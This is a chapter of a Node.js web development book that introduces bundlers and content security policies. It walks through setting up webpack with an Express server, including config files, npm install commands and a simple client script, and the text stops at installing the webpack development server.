<html><head></head><body>
<div class="calibre1" id="_idContainer100">
<h1 class="chapternumber"><span class="kobospan" id="kobo.1.1">7</span></h1>
<h1 class="chaptertitle" id="_idParaDest-134"><span class="kobospan" id="kobo.2.1">Using Bundles and Content Security</span></h1>
<p class="normal1"><span class="kobospan" id="kobo.3.1">Modern web development requires three key components: the backend server, the client-side application, and the browser. </span><span class="kobospan" id="kobo.3.2">Earlier chapters have demonstrated how the Node.js API – and its add-on packages – can be used to receive and process HTTP requests. </span><span class="kobospan" id="kobo.3.3">Now it is time to explore how the server-side part of the application has to work together with the other components.</span></p>
<p class="normal"><span class="kobospan" id="kobo.4.1">This chapter covers two topics that shape the way the parts of an application fit together. </span><span class="kobospan" id="kobo.4.2">The first topic is </span><a id="_idIndexMarker359" class="calibre3"/><span class="kobospan" id="kobo.5.1">using a </span><strong class="screentext"><span class="kobospan" id="kobo.6.1">bundler</span></strong><span class="kobospan" id="kobo.7.1">. </span><span class="kobospan" id="kobo.7.2">The client-side part of an application usually consists of a large number of files, and these are gathered together and compressed into a small number of files for efficiency. </span><span class="kobospan" id="kobo.7.3">This is done by a bundler and most of the widely used client-side frameworks, such as Angular and React, provide developer tools that use a bundler named webpack. </span><span class="kobospan" id="kobo.7.4">In the first part of the chapter, I explain how webpack works and describe the different ways that it can be integrated with the backend server. </span><em class="italic"><span class="kobospan" id="kobo.8.1">Table 7.1</span></em><span class="kobospan" id="kobo.9.1"> puts bundlers in context.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.10.1">Table 7.1: Putting Bundlers in context</span></p>
<table class="table-container" id="table001-4">
<tbody class="calibre8">
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.11.1">Question</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.12.1">Answer</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.13.1">What are they?</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.14.1">Bundlers combine and compress the files required by the client-side part of the application.</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.15.1">Why are they useful?</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.16.1">Bundlers reduce the number of HTTP requests the browser has to make to get the client-side files and reduce the total amount of data that has to be transferred. </span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.17.1">How are they used?</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.18.1">Bundlers can be used stand-alone or integrated into the server-side build tools.</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.19.1">Are there any pitfalls or limitations?</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.20.1">Bundlers are often integrated into more complex client-side development tools and cannot always be configured directly, which can limit the options for integration with the backend server.</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.21.1">Are there any alternatives?</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.22.1">Bundlers are not required, but adoption is usually driven by the choice of build tools for the client-side framework.</span></p>
</td>
</tr>
</tbody>
</table>
<p class="normal"><span class="kobospan" id="kobo.23.1">The second topic in this chapter is the </span><a id="_idIndexMarker360" class="calibre3"/><span class="kobospan" id="kobo.24.1">use of a </span><strong class="screentext"><span class="kobospan" id="kobo.25.1">content security policy</span></strong><span class="kobospan" id="kobo.26.1"> (</span><strong class="screentext"><span class="kobospan" id="kobo.27.1">CSP</span></strong><span class="kobospan" id="kobo.28.1">). </span><span class="kobospan" id="kobo.28.2">Browsers are active participants in web applications, and CSPs allow the browser to stop client-side JavaScript code from performing</span><a id="_idIndexMarker361" class="calibre3"/><span class="kobospan" id="kobo.29.1"> unexpected actions. </span><span class="kobospan" id="kobo.29.2">Content security policies are an important defense against</span><strong class="screentext"><span class="kobospan" id="kobo.30.1"> cross-site scripting</span></strong><span class="kobospan" id="kobo.31.1"> (</span><strong class="screentext"><span class="kobospan" id="kobo.32.1">XSS</span></strong><span class="kobospan" id="kobo.33.1">) attacks, in which an attacker subverts the application to execute JavaScript code.</span></p>
<p class="normal"><span class="kobospan" id="kobo.34.1">In this chapter, I deliberately create an XSS vulnerability in the example application, demonstrate how it can be exploited, and then use a content security browser to provide the browser with the information it needs to stop the application from being abused. </span><em class="italic"><span class="kobospan" id="kobo.35.1">Table 7.2</span></em><span class="kobospan" id="kobo.36.1"> puts content security policies in context.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.37.1">Table 7.2: Putting Content security policies in context</span></p>
<table class="table-container" id="table002-4">
<tbody class="calibre8">
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.38.1">Question</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.39.1">Answer</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.40.1">What are they?</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.41.1">Content security policies describe the expected behavior of the client-side code to the browser. </span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.42.1">Why are they useful?</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.43.1">Browsers stop JavaScript code from performing actions that deviate from those defined by the content security policy.</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.44.1">How are they used?</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan3" id="kobo.45.1">The backend server includes a </span><code class="inlinecode"><span class="kobospan2" id="kobo.46.1">Content-Security-Policy</span></code><span class="kobospan" id="kobo.47.1"> header in HTTP responses. </span><span class="kobospan4" id="kobo.47.2">The header specifies directives that describe the expected behavior of the client-side code. </span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.48.1">Are there any pitfalls or limitations?</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan3" id="kobo.49.1">It can require careful testing to define a content security policy that allows the client-side code to function without creating opportunities for XSS attacks. </span><span class="kobospan" id="kobo.49.2">For this reason, content security policies must be used alongside other measures, such as input sanitization, as described in </span><em class="italic"><span class="kobospan2" id="kobo.50.1">Part 2</span></em><span class="kobospan4" id="kobo.51.1"> of this book.</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.52.1">Are there any alternatives?</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.53.1">Content security policies are optional but provide an important defense against subversion of the client-side part of the application and should be used whenever possible. </span></p>
</td>
</tr>
</tbody>
</table>
<p class="normal"><em class="italic"><span class="kobospan" id="kobo.54.1">Table 7.3</span></em><span class="kobospan" id="kobo.55.1"> summarizes the chapter.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.56.1">Table 7.3: Chapter Summary</span></p>
<table class="table-container" id="table003-4">
<tbody class="calibre8">
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.57.1">Problem</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.58.1">Solution</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.59.1">Listing</span></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.60.1">Combine client-side files to minimize HTTP requests </span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.61.1">Use a JavaScript bundler such as webpack.</span></p>
</td>
<td class="table-cell">
<p class="normal"><em class="italic1"><span class="kobospan2" id="kobo.62.1">6-10</span></em></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.63.1">Reload the browser automatically when a new bundle is created</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.64.1">Use the webpack development HTTP server.</span></p>
</td>
<td class="table-cell">
<p class="normal"><em class="italic1"><span class="kobospan2" id="kobo.65.1">11-14</span></em></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.66.1">Receive backend server requests from bundled client-side code</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.67.1">Use a separate URL and enable CORS on the backend server, or proxy requests between the two servers.</span></p>
</td>
<td class="table-cell">
<p class="normal"><em class="italic1"><span class="kobospan2" id="kobo.68.1">15-22</span></em></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.69.1">Defend against cross-site scripting attacks</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.70.1">Define and apply a content security policy.</span></p>
</td>
<td class="table-cell">
<p class="normal"><em class="italic1"><span class="kobospan2" id="kobo.71.1">23-33</span></em></p>
</td>
</tr>
<tr class="calibre9">
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.72.1">Simplify the process of defining a content security policy</span></p>
</td>
<td class="table-cell">
<p class="normal"><span class="kobospan2" id="kobo.73.1">Use a JavaScript package such as Helmet.</span></p>
</td>
<td class="table-cell">
<p class="normal"><em class="italic1"><span class="kobospan2" id="kobo.74.1">34-36</span></em></p>
</td>
</tr>
</tbody>
</table>
<h1 class="heading" id="_idParaDest-135"><span class="kobospan" id="kobo.75.1">Preparing for this chapter</span></h1>
<p class="normal1"><span class="kobospan" id="kobo.76.1">In this chapter, I continue using the </span><code class="inlinecode"><span class="kobospan" id="kobo.77.1">webapp</span></code><span class="kobospan" id="kobo.78.1"> project from </span><em class="italic"><span class="kobospan" id="kobo.79.1">Chapter 6</span></em><span class="kobospan" id="kobo.80.1">. </span><span class="kobospan" id="kobo.80.2">To prepare for this chapter, replace the contents of the </span><code class="inlinecode"><span class="kobospan" id="kobo.81.1">readHandler.ts</span></code><span class="kobospan" id="kobo.82.1"> file with the code shown in </span><em class="italic"><span class="kobospan" id="kobo.83.1">Listing 7.1</span></em><span class="kobospan" id="kobo.84.1">.</span></p>
<div class="packt_tip">
<p class="normal"><strong class="screentext"><span class="kobospan" id="kobo.85.1">Tip</span></strong></p>
<p class="normal"><span class="kobospan" id="kobo.86.1">You can download the example project for this chapter – and for all the other chapters in this book – from </span><a href="https://github.com/PacktPublishing/Mastering-Node.js-Web-Development" class="calibre3"><span class="calibre3"><span class="kobospan" id="kobo.87.1">https://github.com/PacktPublishing/Mastering-Node.js-Web-Development</span></span></a><span class="kobospan" id="kobo.88.1">. </span><span class="kobospan" id="kobo.88.2">See </span><em class="italic"><span class="kobospan" id="kobo.89.1">Chapter 1</span></em><span class="kobospan" id="kobo.90.1"> for how to get help if you have problems running the examples.</span></p>
</div>
<p class="packt_figref"><span class="kobospan" id="kobo.91.1">Listing 7.1: The contents of the readHandler.ts file in the src folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.92.1">import { Request, Response } from "express";
export const readHandler = (req: Request, resp: Response) =&gt; {   
    resp.json({
        message: "Hello, World"
    });
}
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.93.1">This handler replies to all messages with a response that contains a JSON-formatted object. </span><span class="kobospan" id="kobo.93.2">Replace the contents of the </span><code class="inlinecode"><span class="kobospan" id="kobo.94.1">server.ts</span></code><span class="kobospan" id="kobo.95.1"> file in the </span><code class="inlinecode"><span class="kobospan" id="kobo.96.1">src</span></code><span class="kobospan" id="kobo.97.1"> folder with the code shown in </span><em class="italic"><span class="kobospan" id="kobo.98.1">Listing 7.2</span></em><span class="kobospan" id="kobo.99.1">.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.100.1">Listing 7.2: The contents of the server.ts file in the src folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.101.1">import { createServer } from "http";
import express, {Express } from "express";
import { readHandler } from "./readHandler";
const port = 5000;
const expressApp: Express = express();
expressApp.use(express.json());
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
const server = createServer(expressApp);
server.listen(port,
    () =&gt; console.log(`HTTP Server listening on port ${port}`));
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.102.1">This code removes some of the handlers used in the previous examples and uses Express to serve static content and match POST requests to the </span><code class="inlinecode"><span class="kobospan" id="kobo.103.1">/read</span></code><span class="kobospan" id="kobo.104.1"> path to the handler defined in </span><em class="italic"><span class="kobospan" id="kobo.105.1">Listing 7.1</span></em><span class="kobospan" id="kobo.106.1">.</span></p>
<p class="normal"><span class="kobospan" id="kobo.107.1">Next, replace the contents of the </span><code class="inlinecode"><span class="kobospan" id="kobo.108.1">index.html</span></code><span class="kobospan" id="kobo.109.1"> file in the </span><code class="inlinecode"><span class="kobospan" id="kobo.110.1">static</span></code><span class="kobospan" id="kobo.111.1"> folder with the elements shown in </span><em class="italic"><span class="kobospan" id="kobo.112.1">Listing 7.3</span></em><span class="kobospan" id="kobo.113.1">, which removes the image used in the previous chapter and applies styles provided by the Bootstrap CSS package to a table that displays the responses from the server.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.114.1">Listing 7.3: The contents of the index.html file in the static folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.115.1">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;script src="client.js"&gt;&lt;/script&gt;
        &lt;link href="css/bootstrap.min.css" rel="stylesheet" /&gt;
    &lt;/head&gt;
    &lt;body&gt;
       &lt;button id="btn" class="btn btn-primary m-2"&gt;Send Request&lt;/button&gt;
       &lt;table class="table table-striped"&gt;
            &lt;tbody&gt;
                &lt;tr&gt;&lt;th&gt;Status&lt;/th&gt;&lt;td id="msg"&gt;&lt;/td&gt;&lt;/tr&gt;
                &lt;tr&gt;&lt;th&gt;Response&lt;/th&gt;&lt;td id="body"&gt;&lt;/td&gt;&lt;/tr&gt;
            &lt;/tbody&gt;
       &lt;/table&gt;
    &lt;/body&gt;
&lt;/html&gt;
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.116.1">Run the command shown in </span><em class="italic"><span class="kobospan" id="kobo.117.1">Listing 7.4</span></em><span class="kobospan" id="kobo.118.1"> in the </span><code class="inlinecode"><span class="kobospan" id="kobo.119.1">webapp</span></code><span class="kobospan" id="kobo.120.1"> folder to start the watcher that compiles TypeScript files and executes the JavaScript that is produced.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.121.1">Listing 7.4: Starting the project</span></p>
<pre class="programlisting1"><code class="hljs-con"><span class="kobospan" id="kobo.122.1">npm start
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.123.1">Open a web browser and request </span><code class="inlinecode"><span class="kobospan" id="kobo.124.1">http://localhost:5000</span></code><span class="kobospan" id="kobo.125.1">. </span><span class="kobospan" id="kobo.125.2">Click the </span><strong class="screentext"><span class="kobospan" id="kobo.126.1">Send Request</span></strong><span class="kobospan" id="kobo.127.1"> button and you will see the result shown in </span><em class="italic"><span class="kobospan" id="kobo.128.1">Figure 7.1</span></em><span class="kobospan" id="kobo.129.1">.</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.130.1"><img alt="" src="../Images/B21959_07_01.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.131.1">Figure 7.1: Running the example project</span></p>
<h1 class="heading" id="_idParaDest-136"><span class="kobospan" id="kobo.132.1">Packaging client files</span></h1>
<p class="normal1"><span class="kobospan" id="kobo.133.1">The client side of </span><a id="_idIndexMarker362" class="calibre3"/><span class="kobospan" id="kobo.134.1">web applications is usually executed by a browser, and the application is delivered as an HTML file that, in turn, tells the browser to request JavaScript files, CSS stylesheets, and any other resources that are required.</span></p>
<p class="normal"><span class="kobospan" id="kobo.135.1">There can be many JavaScript and CSS files, which means the browser has to make HTTP requests for many files. </span><span class="kobospan" id="kobo.135.2">Those files tend to be verbose because they are formatted to be read and maintained by the development team, with whitespace and comments that are not required to run the application.</span></p>
<p class="normal"><span class="kobospan" id="kobo.136.1">Many projects use a bundler, which processes client-side assets to make them smaller and combine them into fewer files. </span><span class="kobospan" id="kobo.136.2">The most popular bundler is webpack (</span><a href="https://webpack.js.org" class="calibre3"><span class="calibre3"><span class="kobospan" id="kobo.137.1">https://webpack.js.org</span></span></a><span class="kobospan" id="kobo.138.1">), which</span><a id="_idIndexMarker363" class="calibre3"/><span class="kobospan" id="kobo.139.1"> can be used on its own or as part of the standard developer tools for frameworks such as React and Angular. </span><span class="kobospan" id="kobo.139.2">There are other bundlers available, just as with most areas of JavaScript functionality, but webpack is a good place to start because of its popularity and longevity.</span></p>
<p class="normal"><span class="kobospan" id="kobo.140.1">Bundlers can help the server side of the project by concentrating the requests clients make </span><a id="_idIndexMarker364" class="calibre3"/><span class="kobospan" id="kobo.141.1">for resources into fewer requests and smaller files. </span><span class="kobospan" id="kobo.141.2">However, bundlers often need work to integrate them with the project so that client-side and server-side development can be easily combined. </span></p>
<p class="normal"><span class="kobospan" id="kobo.142.1">In the sections </span><a id="_idIndexMarker365" class="calibre3"/><span class="kobospan" id="kobo.143.1">that follow, I describe the different ways bundles can be used and explain the impact each of them has on server-side development. </span><span class="kobospan" id="kobo.143.2">Run the command shown in </span><em class="italic"><span class="kobospan" id="kobo.144.1">Listing 7.5</span></em><span class="kobospan" id="kobo.145.1"> in the </span><code class="inlinecode"><span class="kobospan" id="kobo.146.1">webapp</span></code><span class="kobospan" id="kobo.147.1"> folder to install the </span><code class="inlinecode"><span class="kobospan" id="kobo.148.1">webpack</span></code><span class="kobospan" id="kobo.149.1"> packages. </span><span class="kobospan" id="kobo.149.2">This command also installs the </span><code class="inlinecode"><span class="kobospan" id="kobo.150.1">npm-run-all</span></code><span class="kobospan" id="kobo.151.1"> package, which allows multiple NPM scripts to be run concurrently.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.152.1">Listing 7.5: Installing the bundler packages</span></p>
<pre class="programlisting1"><code class="hljs-con"><span class="kobospan" id="kobo.153.1">npm install --save-dev webpack@5.89.0
npm install --save-dev webpack-cli@5.1.4
npm install --save-dev npm-run-all@4.1.5
</span></code></pre>
<h2 class="heading1" id="_idParaDest-137"><span class="kobospan" id="kobo.154.1">Creating stand-alone bundles</span></h2>
<p class="normal1"><span class="kobospan" id="kobo.155.1">The </span><a id="_idIndexMarker366" class="calibre3"/><span class="kobospan" id="kobo.156.1">simplest way to use a bundler is as a stand-alone tool. </span><span class="kobospan" id="kobo.156.2">To configure </span><code class="inlinecode"><span class="kobospan" id="kobo.157.1">webpack</span></code><span class="kobospan" id="kobo.158.1">, add a file named </span><code class="inlinecode"><span class="kobospan" id="kobo.159.1">webpack.config.mjs</span></code><span class="kobospan" id="kobo.160.1"> to the </span><code class="inlinecode"><span class="kobospan" id="kobo.161.1">webapp</span></code><span class="kobospan" id="kobo.162.1"> folder with the content shown in </span><em class="italic"><span class="kobospan" id="kobo.163.1">Listing 7.6</span></em><span class="kobospan" id="kobo.164.1">. </span><span class="kobospan" id="kobo.164.2">webpack uses a JavaScript – rather than JSON – configuration file and the </span><code class="inlinecode"><span class="kobospan" id="kobo.165.1">mjs</span></code><span class="kobospan" id="kobo.166.1"> file extension specifies a JavaScript module, which allows the use of the same </span><code class="inlinecode"><span class="kobospan" id="kobo.167.1">import</span></code><span class="kobospan" id="kobo.168.1"> syntax used throughout this book. </span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.169.1">Listing 7.6: The contents of the webpack.config.mjs file in the webapp folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.170.1">import path from "path";
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
export default  {
    mode: "development",
    entry: "./static/client.js",
    output: {
        path: path.resolve(__dirname, "dist/client"),
        filename: "bundle.js"
    }
};
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.171.1">This basic configuration file tells </span><code class="inlinecode"><span class="kobospan" id="kobo.172.1">webpack</span></code><span class="kobospan" id="kobo.173.1"> to process the </span><code class="inlinecode"><span class="kobospan" id="kobo.174.1">client.js</span></code><span class="kobospan" id="kobo.175.1"> file in the </span><code class="inlinecode"><span class="kobospan" id="kobo.176.1">static</span></code><span class="kobospan" id="kobo.177.1"> folder and write the bundle it creates to a file named </span><code class="inlinecode"><span class="kobospan" id="kobo.178.1">bundle.js</span></code><span class="kobospan" id="kobo.179.1"> in the </span><code class="inlinecode"><span class="kobospan" id="kobo.180.1">dist/client</span></code><span class="kobospan" id="kobo.181.1"> folder. </span><span class="kobospan" id="kobo.181.2">There</span><a id="_idIndexMarker367" class="calibre3"/><span class="kobospan" id="kobo.182.1"> isn’t enough client-side JavaScript in the example project to give webpack much to do, but in a real project, webpack will follow all the imports made in the starting JavaScript file and incorporate all of the code the application requires into the bundle. </span><em class="italic"><span class="kobospan" id="kobo.183.1">Listing 7.7</span></em><span class="kobospan" id="kobo.184.1"> updates the </span><code class="inlinecode"><span class="kobospan" id="kobo.185.1">index.html</span></code><span class="kobospan" id="kobo.186.1"> file so that it uses the </span><code class="inlinecode"><span class="kobospan" id="kobo.187.1">bundle.js</span></code><span class="kobospan" id="kobo.188.1"> file that webpack will create.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.189.1">Listing 7.7: Using the bundle file in the index.html file in the static folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.190.1">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        </span><strong class="screentext"><span class="kobospan" id="kobo.191.1">&lt;script src="bundle.js"&gt;&lt;/script&gt;</span></strong><span class="kobospan" id="kobo.192.1">
        &lt;link href="css/bootstrap.min.css" rel="stylesheet" /&gt;
    &lt;/head&gt;
    &lt;body&gt;
       &lt;button id="btn" class="btn btn-primary m-2"&gt;Send Request&lt;/button&gt;
       &lt;table class="table table-striped"&gt;
            &lt;tbody&gt;
                &lt;tr&gt;&lt;th&gt;Status&lt;/th&gt;&lt;td id="msg"&gt;&lt;/td&gt;&lt;/tr&gt;
                &lt;tr&gt;&lt;th&gt;Response&lt;/th&gt;&lt;td id="body"&gt;&lt;/td&gt;&lt;/tr&gt;
            &lt;/tbody&gt;
       &lt;/table&gt;
    &lt;/body&gt;
&lt;/html&gt;
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.193.1">To allow the client to request the </span><code class="inlinecode"><span class="kobospan" id="kobo.194.1">bundle.js</span></code><span class="kobospan" id="kobo.195.1"> file, </span><em class="italic"><span class="kobospan" id="kobo.196.1">Listing 7.8</span></em><span class="kobospan" id="kobo.197.1"> uses the Express static files middleware to add a new location for file requests.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.198.1">Listing 7.8: Adding a file location in the server.ts file in the src folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.199.1">...
</span><span class="kobospan" id="kobo.199.2">expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
</span><strong class="screentext"><span class="kobospan" id="kobo.200.1">expressApp.use(express.static("</span></strong><strong class="screentext"><span class="kobospan" id="kobo.201.1">dist/client"));</span></strong><span class="kobospan" id="kobo.202.1">
...
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.203.1">The final step is </span><a id="_idIndexMarker368" class="calibre3"/><span class="kobospan" id="kobo.204.1">to update the </span><code class="inlinecode"><span class="kobospan" id="kobo.205.1">scripts</span></code><span class="kobospan" id="kobo.206.1"> section of the </span><code class="inlinecode"><span class="kobospan" id="kobo.207.1">package.json</span></code><span class="kobospan" id="kobo.208.1"> file so that webpack is run in watch mode alongside the existing build process for the server-side JavaScript file, as shown in </span><em class="italic"><span class="kobospan" id="kobo.209.1">Listing 7.9</span></em><span class="kobospan" id="kobo.210.1">. </span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.211.1">Listing 7.9: Updating scripts in the package.json file in the webapp folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.212.1">...
</span><span class="kobospan" id="kobo.212.2">"scripts": {
</span><strong class="screentext"><span class="kobospan" id="kobo.213.1">    "server": "tsc-watch --onsuccess \"node dist/server.js\"",</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.214.1">    "client"</span></strong><strong class="screentext"><span class="kobospan" id="kobo.215.1">: "webpack --watch",</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.216.1">    "start": "npm-run-all --parallel server client"</span></strong><span class="kobospan" id="kobo.217.1">
},
...
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.218.1">The new </span><code class="inlinecode"><span class="kobospan" id="kobo.219.1">start</span></code><span class="kobospan" id="kobo.220.1"> command uses the </span><code class="inlinecode"><span class="kobospan" id="kobo.221.1">npm-run-all</span></code><span class="kobospan" id="kobo.222.1"> package to start </span><code class="inlinecode"><span class="kobospan" id="kobo.223.1">client</span></code><span class="kobospan" id="kobo.224.1"> and </span><code class="inlinecode"><span class="kobospan" id="kobo.225.1">server</span></code><span class="kobospan" id="kobo.226.1"> commands that run the webpack client-side bundler and the server-side TypeScript compiler side by side. </span><span class="kobospan" id="kobo.226.2">Putting webpack into watch mode means the bundle will be updated automatically when the client-side JavaScript file is altered.</span></p>
<p class="normal"><span class="kobospan" id="kobo.227.1">Stop the existing Node.js server and run the </span><code class="inlinecode"><span class="kobospan" id="kobo.228.1">npm</span></code> <code class="inlinecode"><span class="kobospan" id="kobo.229.1">start</span></code><span class="kobospan" id="kobo.230.1"> command in the </span><code class="inlinecode"><span class="kobospan" id="kobo.231.1">webapp</span></code><span class="kobospan" id="kobo.232.1"> folder. </span><em class="italic"><span class="kobospan" id="kobo.233.1">Listing 7.10</span></em><span class="kobospan" id="kobo.234.1"> makes a small change to the client-side code that will demonstrate webpack change detection.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.235.1">Listing 7.10: Making a small change in the client.js file in the static folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.236.1">document.addEventListener('DOMContentLoaded', function() {
    document.getElementById("btn").addEventListener("click", sendReq);
});
sendReq = async () =&gt; {
    let payload = [];
    for (let i = 0; i &lt; 5; i++) {
        payload.push({ id: i, message: `Payload Message: ${i}\n`});
    }
    const response = await fetch("/read", {
        method: "POST", body: JSON.stringify(payload),
        headers: {
            "Content-Type": "application/json"
        }
    })
    document.getElementById("msg").textContent = response.statusText;
  </span><strong class="screentext"> </strong><strong class="screentext"><span class="kobospan" id="kobo.237.1">document.getElementById("body").textContent</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.238.1">        = `Resp: ${await response.text()}`;</span></strong><span class="kobospan" id="kobo.239.1">
}
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.240.1">When</span><a id="_idIndexMarker369" class="calibre3"/><span class="kobospan" id="kobo.241.1"> the </span><code class="inlinecode"><span class="kobospan" id="kobo.242.1">client.js</span></code><span class="kobospan" id="kobo.243.1"> file is saved, the change will be detected by webpack, which will create a new bundle file, producing console messages like these:</span></p>
<pre class="programlisting1"><code class="hljs-con"><span class="kobospan" id="kobo.244.1">assets by status 1.86 KiB [cached] 1 asset
./static/client.js 631 bytes [built]
webpack 5.89.0 compiled successfully in 13 ms
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.245.1">Reload the browser – or open a new browser and request </span><code class="inlinecode"><span class="kobospan" id="kobo.246.1">http://localhost:5000</span></code><span class="kobospan" id="kobo.247.1"> – and click the Send Request button and you will see the effect of the change when the response is displayed, as shown in </span><em class="italic"><span class="kobospan" id="kobo.248.1">Figure 7.2</span></em><span class="kobospan" id="kobo.249.1">.</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.250.1"><img alt="" src="../Images/B21959_07_02.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.251.1">Figure 7.2: Using a client-side bundler</span></p>
<h2 class="heading1" id="_idParaDest-138"><span class="kobospan" id="kobo.252.1">Using the webpack development server</span></h2>
<p class="normal1"><span class="kobospan" id="kobo.253.1">webpack provides </span><a id="_idIndexMarker370" class="calibre3"/><span class="kobospan" id="kobo.254.1">an HTTP server that streamlines the client-side development process, and this is widely used as the basis for popular development packages for Angular, React, and other popular frameworks. </span><span class="kobospan" id="kobo.254.2">If the client-side part of your project relies on one of these frameworks, then you are likely to find yourself working with the webpack development server.</span></p>
<p class="normal"><span class="kobospan" id="kobo.255.1">The webpack development server can be used for client-side development alongside the conventional server-side functionality, albeit with some integration. </span><span class="kobospan" id="kobo.255.2">Run the command shown in </span><em class="italic"><span class="kobospan" id="kobo.256.1">Listing 7.11</span></em><span class="kobospan" id="kobo.257.1"> in the </span><code class="inlinecode"><span class="kobospan" id="kobo.258.1">webapp</span></code><span class="kobospan" id="kobo.259.1"> folder to install the webpack development HTTP server. </span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.260.1">Listing 7.11: Adding the development server package</span></p>
<pre class="programlisting1"><code class="hljs-con"><span class="kobospan" id="kobo.261.1">npm install --save-dev webpack-dev-server@4.15.1
</span></code></pre>
